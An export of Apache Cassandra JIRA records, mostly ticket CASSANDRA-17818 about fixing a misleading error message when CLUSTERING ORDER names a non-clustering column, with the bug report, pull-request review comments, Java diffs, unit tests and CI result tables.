4.0 https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/286/workflows/4a1fc543-9733-4c95-b7b9-bd7dd7145a24
;;;","14/Sep/22 11:02;jlewandowski;4.1 j11 - https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/284/workflows/73d5e9e2-be31-4ad4-a3e1-8639ec0529aa
trunk j11 - https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/285/workflows/600dcc96-5d47-48ab-bc24-e4617decff1f
;;;","14/Sep/22 13:42;adelapena;Here is another (hopefully final) round of CI including all upgrade tests and repeated runs for j8-j8, j8-j11 and j11-j11:
||PR||CI||
|[4.0  |https://github.com/apache/cassandra/pull/1850]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2085/workflows/ef81589b-7877-4e4c-812a-ea4fea033295] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2085/workflows/e4220aaf-2b81-4604-bfa3-a5741711a978]|
|[4.1  |https://github.com/apache/cassandra/pull/1804]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2083/workflows/e9e95014-81ce-4d19-b2eb-bac0f11d36f9] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2083/workflows/b24b761f-0cef-4999-992e-8dc0367eb07a]|
|[trunk|https://github.com/apache/cassandra/pull/1849]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2084/workflows/5f0f152b-ada3-4d92-bcbf-073463cf8b46] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2084/workflows/5f27f917-c43c-4d05-9a8f-6bd57b921d89]|
;;;","14/Sep/22 14:52;adelapena;All green in the last run, the only thing to investigate would be [this failure|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/285/workflows/600dcc96-5d47-48ab-bc24-e4617decff1f/jobs/2291/tests] in {{{}hintedhandoff_test.py::TestHintedHandoff::test_hintedhandoff_window{}}}, which doesn't seem related. Indeed, it seems a resurrection of CASSANDRA-17144.;;;","14/Sep/22 14:55;e.dimitrova;Thanks [~adelapena] , I will open a new ticket for that one as it seems Stefan said he will take a look but that ticket is closed and he got side-tracked. I will ping him ;;;","14/Sep/22 14:59;adelapena;+1 from me, the only things we are missing are the TODO comment referencing CASSANDRA-17883 and the NEWS.txt entry about reset;;;","14/Sep/22 15:05;e.dimitrova;CASSANDRA-17891 opened for _hintedhandoff_test.py::TestHintedHandoff::test_hintedhandoff_window_
{quote}+1 from me, the only things we are missing are the TODO comment referencing CASSANDRA-17883 and the NEWS.txt entry about reset
{quote}
I second [~adelapena] , thanks :) ;;;","16/Sep/22 07:29;jlewandowski;Thank you, I'll merge today;;;","11/Jan/23 09:18;bereng;#justfyi in case it could be related? https://app.circleci.com/pipelines/github/bereng/cassandra/836/workflows/dd9f0441-df59-40e7-b00b-c0788f0235a6/jobs/7597/tests#failed-test-0;;;","11/Jan/23 19:40;e.dimitrova;Thanks [~bereng], as this ticket was closed In September 2022 I think it makes sense to open new one and link it to this one {*}if related{*}.

Whether it is related - I don't know as:

1) At the time the patch was submitted tests were ran many times in a loop

2) I see your example is from trunk which is quite active now so it could be something newly introduced. ;;;","12/Jan/23 07:59;bereng;Yeah makes sense. I opened CASSANDRA-17151 and pointed toward this and the history of tickets for this test. We can remove that link if we find out it's wrong later.;;;","12/Jan/23 08:34;smiklosovic;I hit that too here recently: https://app.circleci.com/pipelines/github/instaclustr/cassandra/1701/workflows/6adcd572-b3dd-4f9f-af86-4f20f78d36d8/jobs/8169/tests#failed-test-1;;;",,,,,,,,,,,,,,,,,,,,,,,,,
Fix error message handling when trying to use CLUSTERING ORDER with non-clustering column,CASSANDRA-17818,13476912,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,qannap,e.dimitrova,e.dimitrova,16/Aug/22 00:44,14/Jun/23 17:08,13/Jul/23 08:40,14/Jun/23 16:41,3.11.16,4.0.11,4.1.3,5.0,,,CQL/Syntax,,,,0,lhf,"Imagine ck1, ck2, v columns. For ""CLUSTERING ORDER ck1 ASC, v DESC"" error msg will suggest that information for ck2 is missing. But if you add it it will still be wrong as ""v"" cannot be used. So the problem here is really about using non-clustering column rather than about not providing information about some clustering column.

The following is example from 3.11, but the code is the same in 4.0, 4.1, trunk:
{code:java}
cqlsh:k_test> CREATE TABLE test2 (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (v ASC);
InvalidRequest: Error from server: code=2200 [Invalid query] message=""Missing CLUSTERING ORDER for column ck1""

cqlsh:k_test> CREATE TABLE test2 (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, v ASC);
InvalidRequest: Error from server: code=2200 [Invalid query] message=""Missing CLUSTERING ORDER for column ck2""

cqlsh:k_test> CREATE TABLE test2 (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC, v ASC);
InvalidRequest: Error from server: code=2200 [Invalid query] message=""Only clustering key columns can be defined in CLUSTERING ORDER directive""{code}
We need to be sure that we return to the user the same correct error message in all three cases and it should be ""Only clustering key columns can be defined in CLUSTERING ORDER directive""

+Additional information for newcomers+
 * [This|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/cql3/statements/schema/CreateTableStatement.java#L251-L252] is where we handle the issue incorrectly as proved by the example. The easiest way to handle this issue would be to  check the key set content of {_}clusteringOrder{_}.
 * It would be good also to add more unit tests in [CreateTableValidationTest|https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java] to cover different cases. 
 * I suggest we create patch first for 3.11 and then we can propagate it up to the next versions.",,e.dimitrova,maxwellguo,mfleming,qannap,,,,,,,,,,,"qannap opened a new pull request, #2398:
URL: https://github.com/apache/cassandra/pull/2398

   Fix error message handling when trying to use CLUSTERING ORDER with non-clustering column
   
   Patch: Throw error message after finding there are non-cluster columns in order definition. 
   
   patch by <Ningzi Zhan>
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17818)
   
   


;08/Jun/23 22:13;githubbot;600","qannap opened a new pull request, #2399:
URL: https://github.com/apache/cassandra/pull/2399

   Fix error message handling when trying to use CLUSTERING ORDER with non-clustering column
   
   Patch: Throw error message after finding there are non-cluster columns in order definition. 
   
   patch by <Ningzi Zhan>
   
   The [Cassandra Jira](https://issues.apache.org/jira/browse/CASSANDRA-17818)
   
   


;08/Jun/23 22:15;githubbot;600","Maxwell-Guo commented on code in PR #2399:
URL: https://github.com/apache/cassandra/pull/2399#discussion_r1223734467


##########
src/java/org/apache/cassandra/cql3/statements/schema/CreateTableStatement.java:
##########
@@ -218,6 +218,13 @@ public TableMetadata.Builder builder(Types types)
         if (clusteringOrder.size() > clusteringColumns.size())
             throw ire(""Only clustering columns can be defined in CLUSTERING ORDER directive"");
 
+        for (ColumnIdentifier orederId: clusteringOrder.keySet())
+        {
+            if (!clusteringColumns.contains(orederId)){

Review Comment:
   I think we should move line 223's '{' to a new line



;09/Jun/23 01:50;githubbot;600","driftx commented on code in PR #2399:
URL: https://github.com/apache/cassandra/pull/2399#discussion_r1223744839


##########
src/java/org/apache/cassandra/cql3/statements/schema/CreateTableStatement.java:
##########
@@ -218,6 +218,13 @@ public TableMetadata.Builder builder(Types types)
         if (clusteringOrder.size() > clusteringColumns.size())
             throw ire(""Only clustering columns can be defined in CLUSTERING ORDER directive"");
 
+        for (ColumnIdentifier orederId: clusteringOrder.keySet())
+        {
+            if (!clusteringColumns.contains(orederId)){

Review Comment:
   +1, good catch



;09/Jun/23 01:52;githubbot;600","driftx commented on code in PR #2399:
URL: https://github.com/apache/cassandra/pull/2399#discussion_r1223744839


##########
src/java/org/apache/cassandra/cql3/statements/schema/CreateTableStatement.java:
##########
@@ -218,6 +218,13 @@ public TableMetadata.Builder builder(Types types)
         if (clusteringOrder.size() > clusteringColumns.size())
             throw ire(""Only clustering columns can be defined in CLUSTERING ORDER directive"");
 
+        for (ColumnIdentifier orederId: clusteringOrder.keySet())
+        {
+            if (!clusteringColumns.contains(orederId)){

Review Comment:
   +1, good catch.  This could be handled on commit.



;09/Jun/23 01:53;githubbot;600","ekaterinadimitrova2 commented on code in PR #2398:
URL: https://github.com/apache/cassandra/pull/2398#discussion_r1224306151


##########
test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java:
##########
@@ -48,4 +51,89 @@ public void testInvalidBloomFilterFPRatio() throws Throwable
         // sanity check
         createTable(""CREATE TABLE %s (a int PRIMARY KEY, b int) WITH bloom_filter_fp_chance = 0.1"");
     }
+
+    @Test
+    public void testCreateTableErrorOnNonClusterKey()

Review Comment:
   There is plenty of repetition. We can improve readability by having a utility method and splitting the test into a few small ones; each test name will reflect exactly what we test. Tomek already has something similar in our fork. You can check it and get inspired by it. We can mark him as then co-author on the ticket. 



##########
src/java/org/apache/cassandra/cql3/statements/CreateTableStatement.java:
##########
@@ -345,6 +345,14 @@ public ParsedStatement.Prepared prepare(Types udts) throws RequestValidationExce
                 if (properties.definedOrdering.size() > columnAliases.size())
                     throw new InvalidRequestException(""Only clustering key columns can be defined in CLUSTERING ORDER directive"");
 
+                for (ColumnIdentifier orderId: properties.definedOrdering.keySet())
+                {
+                    if (!columnAliases.contains(orderId))
+                    {
+                        throw new InvalidRequestException(""Only clustering key columns can be defined in CLUSTERING ORDER directive"");

Review Comment:
   We can improve the user experience by adding the names of the columns to the exception message, similar to what Tomek did in our fork



;09/Jun/23 13:28;githubbot;600","Maxwell-Guo commented on code in PR #2398:
URL: https://github.com/apache/cassandra/pull/2398#discussion_r1227441138


##########
src/java/org/apache/cassandra/cql3/statements/CreateTableStatement.java:
##########
@@ -342,8 +344,13 @@ public ParsedStatement.Prepared prepare(Types udts) throws RequestValidationExce
             // If we give a clustering order, we must explicitly do so for all aliases and in the order of the PK
             if (!properties.definedOrdering.isEmpty())
             {
-                if (properties.definedOrdering.size() > columnAliases.size())
-                    throw new InvalidRequestException(""Only clustering key columns can be defined in CLUSTERING ORDER directive"");
+                List<ColumnIdentifier> nonClusterColumn = properties.definedOrdering.keySet().stream()

Review Comment:
   I think we can change the code format to :
   `List<ColumnIdentifier> nonClusterColumn = properties.definedOrdering.keySet().stream()
                                                                                                                                              .filter((id) -> !columnAliases.contains(id))
                                                                                                                                              .collect(Collectors.toList());`
   which align “.stream()” and "".filter()"", "".collect()""



##########
test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java:
##########
@@ -48,4 +51,89 @@ public void testInvalidBloomFilterFPRatio() throws Throwable
         // sanity check
         createTable(""CREATE TABLE %s (a int PRIMARY KEY, b int) WITH bloom_filter_fp_chance = 0.1"");
     }
+
+    @Test
+    public void testCreateTableErrorOnNonClusterKey()

Review Comment:
   +1 with @ekaterinadimitrova2 



;13/Jun/23 02:25;githubbot;600","qannap commented on code in PR #2398:
URL: https://github.com/apache/cassandra/pull/2398#discussion_r1228404014


##########
src/java/org/apache/cassandra/cql3/statements/CreateTableStatement.java:
##########
@@ -342,8 +344,13 @@ public ParsedStatement.Prepared prepare(Types udts) throws RequestValidationExce
             // If we give a clustering order, we must explicitly do so for all aliases and in the order of the PK
             if (!properties.definedOrdering.isEmpty())
             {
-                if (properties.definedOrdering.size() > columnAliases.size())
-                    throw new InvalidRequestException(""Only clustering key columns can be defined in CLUSTERING ORDER directive"");
+                List<ColumnIdentifier> nonClusterColumn = properties.definedOrdering.keySet().stream()

Review Comment:
   Good point! Already changed in the new commit!



;13/Jun/23 16:26;githubbot;600","ekaterinadimitrova2 commented on code in PR #2398:
URL: https://github.com/apache/cassandra/pull/2398#discussion_r1229763593


##########
test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java:
##########
@@ -48,4 +51,60 @@ public void testInvalidBloomFilterFPRatio() throws Throwable
         // sanity check
         createTable(""CREATE TABLE %s (a int PRIMARY KEY, b int) WITH bloom_filter_fp_chance = 0.1"");
     }
+
+    @Test
+    public void testCreateTableOnSelectedClusterColumn()
+    {
+        createTable(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC);"");
+    }
+
+    @Test
+    public void testCreateTableOnAllClusterColumns()
+    {
+        createTable(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC);"");
+    }
+    @Test
+    public void testCreateTableErrorOnNonClusterKey()
+    {
+        String expectedMessage = ""Only clustering key columns can be defined in CLUSTERING ORDER directive"";
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC, v ASC);"",
+                        expectedMessage+"": [v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (v ASC);"",
+                        expectedMessage+"": [v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk ASC);"",
+                        expectedMessage+"": [pk]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk ASC, ck1 DESC);"",
+                        expectedMessage+"": [pk]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC, pk DESC);"",
+                        expectedMessage+"": [pk]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk DESC, v DESC);"",
+                        expectedMessage+"": [pk, v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk DESC, v DESC, ck1 DESC);"",
+                        expectedMessage+"": [pk, v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, v ASC);"",
+                        expectedMessage+"": [v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (v ASC, ck1 DESC);"",
+                        expectedMessage+"": [v]"");
+    }
+
+    @Test
+    public void testCreateTableInWrongOrdering()
+    {
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck2 ASC, ck1 DESC);"",
+                        ""The order of columns in the CLUSTERING ORDER directive must be the one of the clustering key"");
+    }
+
+    @Test
+    public void testCreateTableWithMissingClusterColumn()

Review Comment:
   ```suggestion
       public void testCreateTableWithMissingClusteringColumn()
   ```
   to be fixed on commit



##########
test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java:
##########
@@ -48,4 +51,60 @@ public void testInvalidBloomFilterFPRatio() throws Throwable
         // sanity check
         createTable(""CREATE TABLE %s (a int PRIMARY KEY, b int) WITH bloom_filter_fp_chance = 0.1"");
     }
+
+    @Test
+    public void testCreateTableOnSelectedClusterColumn()

Review Comment:
   ```suggestion
       public void testCreateTableOnSelectedClusteringColumn()
   ```
   to be corrected on commit



##########
test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java:
##########
@@ -48,4 +51,60 @@ public void testInvalidBloomFilterFPRatio() throws Throwable
         // sanity check
         createTable(""CREATE TABLE %s (a int PRIMARY KEY, b int) WITH bloom_filter_fp_chance = 0.1"");
     }
+
+    @Test
+    public void testCreateTableOnSelectedClusterColumn()
+    {
+        createTable(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC);"");
+    }
+
+    @Test
+    public void testCreateTableOnAllClusterColumns()
+    {
+        createTable(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC);"");
+    }
+    @Test
+    public void testCreateTableErrorOnNonClusterKey()
+    {
+        String expectedMessage = ""Only clustering key columns can be defined in CLUSTERING ORDER directive"";
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC, v ASC);"",
+                        expectedMessage+"": [v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (v ASC);"",
+                        expectedMessage+"": [v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk ASC);"",
+                        expectedMessage+"": [pk]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk ASC, ck1 DESC);"",
+                        expectedMessage+"": [pk]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC, pk DESC);"",
+                        expectedMessage+"": [pk]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk DESC, v DESC);"",
+                        expectedMessage+"": [pk, v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (pk DESC, v DESC, ck1 DESC);"",
+                        expectedMessage+"": [pk, v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, v ASC);"",
+                        expectedMessage+"": [v]"");
+        expectedFailure(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (v ASC, ck1 DESC);"",
+                        expectedMessage+"": [v]"");
+    }
+
+    @Test
+    public void testCreateTableInWrongOrdering()

Review Comment:
   ```suggestion
       public void testCreateTableInWrongOrder()
   ```
   to be corrected on commit



##########
test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java:
##########
@@ -48,4 +51,60 @@ public void testInvalidBloomFilterFPRatio() throws Throwable
         // sanity check
         createTable(""CREATE TABLE %s (a int PRIMARY KEY, b int) WITH bloom_filter_fp_chance = 0.1"");
     }
+
+    @Test
+    public void testCreateTableOnSelectedClusterColumn()
+    {
+        createTable(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC);"");
+    }
+
+    @Test
+    public void testCreateTableOnAllClusterColumns()
+    {
+        createTable(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC, ck2 DESC);"");
+    }
+    @Test
+    public void testCreateTableErrorOnNonClusterKey()

Review Comment:
   ```suggestion
       public void testCreateTableErrorOnNonClusteringKey()
   ```
   to be corrected on commit



##########
test/unit/org/apache/cassandra/schema/CreateTableValidationTest.java:
##########
@@ -48,4 +51,60 @@ public void testInvalidBloomFilterFPRatio() throws Throwable
         // sanity check
         createTable(""CREATE TABLE %s (a int PRIMARY KEY, b int) WITH bloom_filter_fp_chance = 0.1"");
     }
+
+    @Test
+    public void testCreateTableOnSelectedClusterColumn()
+    {
+        createTable(""CREATE TABLE %s (pk int, ck1 int, ck2 int, v int, PRIMARY KEY ((pk),ck1, ck2)) WITH CLUSTERING ORDER BY (ck1 ASC);"");
+    }
+
+    @Test
+    public void testCreateTableOnAllClusterColumns()

Review Comment:
   ```suggestion
       public void testCreateTableOnAllClusterColumns()
   ```
   to be corrected on commit



##########
src/java/org/apache/cassandra/cql3/statements/CreateTableStatement.java:
##########
@@ -342,8 +344,14 @@ public ParsedStatement.Prepared prepare(Types udts) throws RequestValidationExce
             // If we give a clustering order, we must explicitly do so for all aliases and in the order of the PK
             if (!properties.definedOrdering.isEmpty())
             {
-                if (properties.definedOrdering.size() > columnAliases.size())
-                    throw new InvalidRequestException(""Only clustering key columns can be defined in CLUSTERING ORDER directive"");
+                List<ColumnIdentifier> nonClusterColumn = properties.definedOrdering.keySet().stream()
+                                                                                    .filter((id) -> !columnAliases.contains(id))
+                                                                                    .collect(Collectors.toList());
+
+                if (!nonClusterColumn.isEmpty())
+                {
+                    throw new InvalidRequestException(""Only clustering key columns can be defined in CLUSTERING ORDER directive: "" + nonClusterColumn + "" are not clustering column"");

Review Comment:
   ```suggestion
                       throw new InvalidRequestException(""Only clustering key columns can be defined in CLUSTERING ORDER directive: "" + nonClusterColumn + "" are not clustering columns"");
   ```
   to be corrected on commit



;14/Jun/23 15:05;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,qannap,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 14 17:08:42 UTC 2023,,,,,,,All,,,,"0|z17ruo:",9223372036854775807,,,,brandon.williams,e.dimitrova,maxwellguo,,Low,,NA,,https://github.com/apache/cassandra/commit/1eccb2bc1ff69817b2fc8d16a4707b64d8b514e7,,,,,,,,,test on CI,,,,,"08/Dec/22 17:10;e.dimitrova;Unassigned it due to inactivity, feel free to assign it back if you plan to work on it;;;","08/Jun/23 22:22;qannap;The patch is submitted through PR

For version 3.11, the PR is [#2398 |https://github.com/apache/cassandra/pull/2398]

For version 4.0 or more advance, the PR is [#2399|https://github.com/apache/cassandra/pull/2399]

I don't have access to circle CI right now, so I might need someone to help me run the tests for all branches. Thank you!!;;;","08/Jun/23 22:46;brandon.williams;LGTM.

||Branch||CI||
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1049/workflows/d762e9d3-6d0f-4be5-be86-7fd286ad2746]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1048/workflows/4c444cba-26de-4770-aa1f-e783a2a1d89d], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1048/workflows/06eab6b4-a791-49a7-b1bc-ffd7d5c0ae55]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1047/workflows/7e5c83ae-30af-43ce-9183-f68cbcdd9a9b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1047/workflows/ae932163-8a40-4af0-80c8-00ad50c25149]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1050/workflows/72962ea6-8d12-4f59-b9f3-f3058a9af827], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1050/workflows/b859f11c-2996-4ee2-872f-95d1adc3275c]|
;;;","09/Jun/23 01:50;maxwellguo;Hello, [~qannap], I think this is a great patch with a well test. 
But I have just saw a small nit with the code format. And I have left a comment for [4.0|https://github.com/apache/cassandra/pull/2399/files] which I think also exist in patchs for other branches.;;;","09/Jun/23 10:42;brandon.williams;3.11: CASSANDRA-17702, CASSANDRA-18021
4.0:  CASSANDRA-18366, CASSANDRA-17884
4.1: CASSANDRA-18432, CASSANDRA-18440
trunk: CASSANDRA-18361

All failures are known, nit can be fixed on commit, I am +1.;;;","09/Jun/23 11:28;maxwellguo;+1 too and I think we need another committer;;;","09/Jun/23 13:43;e.dimitrova;The patch seems correct; I have two suggestions for tiny improvements in test readability and user experience on the PR. As mentioned in Slack, we have something similar in our fork; you can get inspired by that one and mark Tomek Lasica as a co-author. 

About CI:

I checked the test failures; they are present in [Butler|https://butler.cassandra.apache.org/#/] and have already opened corresponding tickets. (3 of them are not seen in Butler, but they had tickets opened based on CircleCI);;;","09/Jun/23 13:59;maxwellguo;what slack🙀？;;;","09/Jun/23 14:09;e.dimitrova;{quote}what slack🙀？
{quote}
Sorry, I had to be explicit - ""I mentioned in Slack to [~qannap]""

You did not miss any Slack messages from me, [~maxwellguo]. Thanks for checking :)   ;;;","09/Jun/23 18:21;qannap;Hi! I make some improvements to the pull request. Please take a look if you are available;;;","09/Jun/23 18:27;brandon.williams;[~qannap] can you do this in the original PR, or combine that one into the new one so there is one source of truth please?;;;","09/Jun/23 18:34;qannap;Sorry, I am a little confused here. I have submitted the modification for version 3.11 and version 4.0 in the original PR, which are slightly different. Do you mean to combine these two? ;;;","09/Jun/23 18:39;brandon.williams;Oh, nevermind, I am the one confused.;;;","09/Jun/23 18:43;brandon.williams;Here's a new CI run:

||Branch||CI||
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1051/workflows/798aad94-f597-4b3e-9fd2-4a2831a69a92]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1054/workflows/aaf8a8ec-99a4-48b2-a49c-8c8ccb6210d1], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1054/workflows/1c047382-844d-4c85-8a7f-955c645790df]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1053/workflows/69f8f166-3b25-46f1-943a-0d74b99481a5], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1053/workflows/1dc790c6-9034-4c25-911c-07310823e1f6]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1052/workflows/90acd76a-9fb4-470a-af0f-3f748fe28e5a], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1052/workflows/def3ea71-d9b1-4a0c-aebe-351742cb5bd1]|
;;;","09/Jun/23 18:49;qannap;Thanks for the CI! ;;;","09/Jun/23 19:54;brandon.williams;3.11: CASSANDRA-17702, CASSANDRA-18021
4.0: CASSANDRA-18366 and a timeout in org.apache.cassandra.cql3.BatchTest not caused by this
4.1: clean
trunk: CASSANDRA-15239

+1 from me again.;;;","10/Jun/23 00:06;maxwellguo;Hello [~qannap], I left some two comments on the newly update pr ([pr-for trunk|https://github.com/driftx/cassandra/commit/599804a2c7a09e3c91edeb252308996f82169b10#diff-d3a07b0245d2af42ac6afef1208d84fc6bd8194273e8343148896be7e6ee54deR133]) in [~brandon.williams]'s git repository.
Besides, I am +1 too. ;;;","12/Jun/23 18:43;e.dimitrova;Hi [~qannap], I left comments on the PR;;;","12/Jun/23 22:13;qannap;Hi! [~e.dimitrova], [~brandon.williams] , [~maxwellguo] I have submitted new commits in the original PR. Please feel free to look into it if you are available. Any opinions are welcome.;;;","13/Jun/23 02:27;maxwellguo;same point of view with [~e.dimitrova] about  the code logic repeats , in addition to a simple code format.
Then I am +1 too~~~:D;;;","13/Jun/23 22:16;e.dimitrova;[~qannap], I can see some new unit tests added today, is this the final version for review?;;;","13/Jun/23 23:10;qannap;Yes! It is! [~e.dimitrova] ;;;","14/Jun/23 01:34;maxwellguo;I think we need a final CI before check in~~~;;;","14/Jun/23 09:56;brandon.williams;||Branch||CI||
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1062/workflows/1343d6d5-f051-4c8c-bc82-7fcb02bafe7d]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1064/workflows/3a3710c1-ad49-4760-8f64-0d33e3b1fe27], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1064/workflows/b4076402-7fcd-4819-8e65-b39ad129aab7]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1065/workflows/4a325eaf-a010-4e01-a637-45469988a271], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1065/workflows/6dbe8ee6-a336-46a2-a6cb-21e2dd1cbb2e]|
